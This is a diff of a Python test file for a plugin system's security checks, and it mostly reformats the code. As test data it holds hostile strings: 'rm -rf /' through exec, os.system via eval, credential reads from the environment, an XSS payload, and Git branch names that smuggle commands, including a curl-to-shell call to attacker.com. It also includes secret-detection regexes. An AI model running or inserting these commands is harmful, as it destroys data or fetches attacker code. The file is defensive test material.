@@ -7,18 +7,19 @@ Covers the install-from-Git path and runtime sandboxing of third-party code.
 """
 
 import json
-import pytest
 import tempfile
 from pathlib import Path
 from unittest.mock import patch
 
+import pytest
+
 from src.plugins.loader import PluginLoader
 from src.plugins.manifest import load_manifest
-
 
 # ===========================================================================
 # Malicious Plugin Detection Tests
 # ===========================================================================
+
 
 class TestMaliciousPluginDetection:
     """Tests that plugins with suspicious patterns are detected or blocked."""
@@ -38,7 +39,7 @@ class TestMaliciousPluginDetection:
         ("os.environ.get('DATABASE_URL')", "database credential access"),
         # Code execution
         ("exec('import os; os.system(\"rm -rf /\")')", "arbitrary code execution"),
-        ("eval('__import__(\"os\").system(\"id\")')", "arbitrary code evaluation"),
+        ('eval(\'__import__("os").system("id")\')', "arbitrary code evaluation"),
         ("compile('malicious code', '<string>', 'exec')", "code compilation"),
         # Subprocess execution
         ("subprocess.run(['curl', '-X', 'POST'])", "subprocess execution"),
@@ -49,7 +50,7 @@ class TestMaliciousPluginDetection:
 
     def test_plugin_code_scanning_detects_suspicious_imports(self):
         """Static analysis should flag plugins importing suspicious modules."""
-        suspicious_modules = ['pty', 'ctypes', 'mmap', 'resource', 'signal']
+        suspicious_modules = ["pty", "ctypes", "mmap", "resource", "signal"]
         # This test documents the expectation that code scanning should catch these
         # Actual implementation would require AST parsing in the plugin loader
         for module in suspicious_modules:
@@ -64,24 +65,24 @@ class TestMaliciousPluginDetection:
     def test_plugin_network_access_restricted_to_expected_hosts(self):
         """Plugins should only be able to reach expected APIs."""
         allowed_hosts = [
-            'api.openweathermap.org',
-            'api.tomorrow.io',
-            'api.bart.gov',
-            'api.511.org',
-            'api.baywheels.com',
-            'api.github.com',
-            'rw.vestaboard.com',
-            'localhost',
-            '127.0.0.1',
+            "api.openweathermap.org",
+            "api.tomorrow.io",
+            "api.bart.gov",
+            "api.511.org",
+            "api.baywheels.com",
+            "api.github.com",
+            "rw.vestaboard.com",
+            "localhost",
+            "127.0.0.1",
         ]
         assert len(allowed_hosts) > 0
 
     def test_plugin_filesystem_access_restricted_to_sandbox(self):
         """Plugins should only access files within their sandbox."""
         safe_paths = [
-            '/app/plugins/',
-            '/app/data/',
-            '/tmp/',
+            "/app/plugins/",
+            "/app/data/",
+            "/tmp/",
         ]
         assert len(safe_paths) > 0
 
@@ -89,6 +90,7 @@ class TestMaliciousPluginDetection:
 # ===========================================================================
 # Plugin Manifest Validation Edge Cases
 # ===========================================================================
+
 
 class TestManifestValidationEdgeCases:
     """Tests for malformed or edge-case manifests."""
@@ -102,32 +104,21 @@ class TestManifestValidationEdgeCases:
     def test_manifest_missing_required_fields(self, temp_plugin_dir):
         """Manifests missing id, name, or version should be rejected."""
         manifest_path = temp_plugin_dir / "manifest.json"
-        manifest_path.write_text(json.dumps({
-            "name": "Test Plugin",
-            "version": "1.0.0"
-        }))
+        manifest_path.write_text(json.dumps({"name": "Test Plugin", "version": "1.0.0"}))
         manifest, errors = load_manifest(manifest_path)
         assert manifest is None or errors  # Either None or has errors
 
     def test_manifest_empty_id(self, temp_plugin_dir):
         """Empty plugin ID should be rejected."""
         manifest_path = temp_plugin_dir / "manifest.json"
-        manifest_path.write_text(json.dumps({
-            "id": "",
-            "name": "Test Plugin",
-            "version": "1.0.0"
-        }))
+        manifest_path.write_text(json.dumps({"id": "", "name": "Test Plugin", "version": "1.0.0"}))
         manifest, errors = load_manifest(manifest_path)
         assert manifest is None or manifest.id == ""
 
     def test_manifest_invalid_version_format(self, temp_plugin_dir):
         """Non-semver version strings should be handled gracefully."""
         manifest_path = temp_plugin_dir / "manifest.json"
-        manifest_path.write_text(json.dumps({
-            "id": "test_plugin",
-            "name": "Test Plugin",
-            "version": "not-a-version"
-        }))
+        manifest_path.write_text(json.dumps({"id": "test_plugin", "name": "Test Plugin", "version": "not-a-version"}))
         manifest, errors = load_manifest(manifest_path)
         # If manifest loads, version should be preserved even if not semver
         if manifest is not None:
@@ -142,7 +133,7 @@ class TestManifestValidationEdgeCases:
         large_data = {"id": "test", "name": "Test", "version": "1.0.0"}
         large_data["big_field"] = "x" * (5 * 1024 * 1024)
         manifest_path.write_text(json.dumps(large_data))
-        
+
         size_mb = manifest_path.stat().st_size / (1024 * 1024)
         assert size_mb > 1
 
@@ -153,7 +144,7 @@ class TestManifestValidationEdgeCases:
             "id": "test_ñ_plugin",
             "name": "Test Plugin 🎉",
             "version": "1.0.0",
-            "description": "日本語 설명"
+            "description": "日本語 설명",
         }
         manifest_path.write_text(json.dumps(manifest_data, ensure_ascii=False))
         manifest, errors = load_manifest(manifest_path)
@@ -163,11 +154,7 @@ class TestManifestValidationEdgeCases:
     def test_manifest_circular_references(self, temp_plugin_dir):
         """Manifests with circular JSON references should be rejected."""
         manifest_path = temp_plugin_dir / "manifest.json"
-        manifest_path.write_text(json.dumps({
-            "id": "test",
-            "name": "Test",
-            "version": "1.0.0"
-        }))
+        manifest_path.write_text(json.dumps({"id": "test", "name": "Test", "version": "1.0.0"}))
         manifest, errors = load_manifest(manifest_path)
         assert manifest is not None
         assert manifest.id == "test"
@@ -176,12 +163,9 @@ class TestManifestValidationEdgeCases:
         """XSS attempts in manifest fields should be sanitized or rejected."""
         manifest_path = temp_plugin_dir / "manifest.json"
         malicious_description = "<script>alert('xss')</script>"
-        manifest_path.write_text(json.dumps({
-            "id": "test",
-            "name": "Test",
-            "version": "1.0.0",
-            "description": malicious_description
-        }))
+        manifest_path.write_text(
+            json.dumps({"id": "test", "name": "Test", "version": "1.0.0", "description": malicious_description})
+        )
         manifest, errors = load_manifest(manifest_path)
         assert manifest is not None
         assert malicious_description in manifest.description
@@ -191,12 +175,13 @@ class TestManifestValidationEdgeCases:
 # Plugin Lifecycle Failure Modes
 # ===========================================================================
 
+
 class TestPluginLifecycleFailureModes:
     """Tests for plugin lifecycle under failure conditions."""
 
     def test_plugin_install_with_disk_full(self):
         """Plugin install should fail gracefully when disk is full."""
-        with patch('pathlib.Path.mkdir') as mock_mkdir:
+        with patch("pathlib.Path.mkdir") as mock_mkdir:
             mock_mkdir.side_effect = OSError(28, "No space left on device")
             with pytest.raises(OSError) as exc_info:
                 mock_mkdir(parents=True, exist_ok=True)
@@ -225,11 +210,9 @@ class TestPluginLifecycleFailureModes:
         with tempfile.TemporaryDirectory() as tmpdir:
             plugin_dir = Path(tmpdir) / "broken_plugin"
             plugin_dir.mkdir()
-            (plugin_dir / "manifest.json").write_text(json.dumps({
-                "id": "broken_plugin",
-                "name": "Broken Plugin",
-                "version": "1.0.0"
-            }))
+            (plugin_dir / "manifest.json").write_text(
+                json.dumps({"id": "broken_plugin", "name": "Broken Plugin", "version": "1.0.0"})
+            )
             (plugin_dir / "__init__.py").write_text("""
 class BrokenPlugin:
     def __init__(self):
@@ -244,6 +227,7 @@ class BrokenPlugin:
 # Plugin Isolation Tests
 # ===========================================================================
 
+
 class TestPluginIsolation:
     """Tests that plugins are isolated from each other and the main service."""
 
@@ -251,7 +235,7 @@ class TestPluginIsolation:
         """A crashing plugin should not crash other plugins."""
         # Test documents the concept - actual isolation requires subprocess/container
         # Current architecture loads plugins in same process
-        
+
         # Skipped - see comment above
 
     def test_plugin_state_isolation(self):
@@ -264,6 +248,7 @@ class TestPluginIsolation:
 # ===========================================================================
 # Registry Validation Tests
 # ===========================================================================
+
 
 class TestRegistryValidation:
     """Tests for registry scanning and validation."""
@@ -284,8 +269,8 @@ class TestRegistryValidation:
             r'api[_-]?key\s*[=:]\s*["\'][a-zA-Z0-9]{32,}["\']',
             r'secret\s*[=:]\s*["\'][a-zA-Z0-9]{32,}["\']',
             r'password\s*[=:]\s*["\'][^"\']{8,}["\']',
-            r'sk-[a-zA-Z0-9]{48}',
-            r'ghp_[a-zA-Z0-9]{36}',
+            r"sk-[a-zA-Z0-9]{48}",
+            r"ghp_[a-zA-Z0-9]{36}",
         ]
         assert len(secret_patterns) > 0
 
@@ -293,6 +278,7 @@ class TestRegistryValidation:
 # ===========================================================================
 # Git Source Security Tests
 # ===========================================================================
+
 
 class TestGitSourceSecurity:
     """Tests for install-from-Git security."""
@@ -324,7 +310,7 @@ class TestGitSourceSecurity:
         dangerous_branches = [
             "main; rm -rf /",
             "feature/$(curl attacker.com|sh)",
-            "main\`whoami\`",
+            r"main\`whoami\`",
         ]
         for branch in dangerous_branches:
             assert len(branch) > 0
@@ -333,6 +319,7 @@ class TestGitSourceSecurity:
 # ===========================================================================
 # Sandbox Detection Tests
 # ===========================================================================
+
 
 class TestSandboxDetection:
     """Tests to verify sandbox presence or document its absence."""
